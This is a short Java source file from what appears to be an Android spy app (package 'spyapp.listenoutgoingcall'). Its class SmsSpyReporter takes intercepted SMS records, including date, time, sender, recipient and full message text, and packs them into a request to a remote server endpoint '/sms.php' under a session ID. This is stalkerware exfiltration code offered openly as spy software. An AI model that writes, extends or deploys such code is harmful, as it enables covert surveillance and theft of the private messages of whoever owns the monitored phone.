package com.example.spyapp.listenoutgoingcall;

import java.util.HashMap;
import java.util.Map;


public class SmsSpyReporter extends SpyReporter {

        @Override
        protected Request createRequest(Report report) {
                SMS sms = (SMS) report;
                String date = LOG_DATE_FORMAT.format(sms.date);
                String time = LOG_TIME_FORMAT.format(sms.date);
                Map<String, String> parameters = new HashMap<String, String>();
                parameters.put("sID", getSession());
                parameters.put("content", date + "\t" + time + "\t" + sms.from + "\t" + sms.to + "\t" + sms.message);
                return new Request(WEBAPI_SERVER_ROOT + "/sms.php", parameters);
        }
}
